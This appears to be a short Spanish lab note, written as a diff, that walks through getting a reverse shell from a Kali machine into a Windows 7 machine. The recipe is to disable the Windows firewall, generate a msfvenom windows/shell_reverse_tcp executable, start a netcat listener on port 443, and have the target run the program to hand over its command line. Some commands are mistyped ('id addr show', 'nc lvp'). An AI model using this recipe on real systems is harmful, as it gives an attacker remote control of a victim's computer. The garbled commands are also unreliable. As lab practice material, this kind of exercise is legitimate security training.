@@ -1,0 +1,9 @@
+++ PC1: Kali
+++ PC2: Windows 7
+
+++ PC2: Firewall de windows apagado
+++ PC1: msfvenom -p windows/shell_reverse_tcp lhost=<ip_PC1> lport=<443> -f exe > <nombre_programa>
+--- Ubicar ip de PC1 con: id addr show
+++ PC1: nc lvp 443
+++ PC2: iniciar el programa
+++ PC1: Tendrá acceso a la línea de comandos de PC2
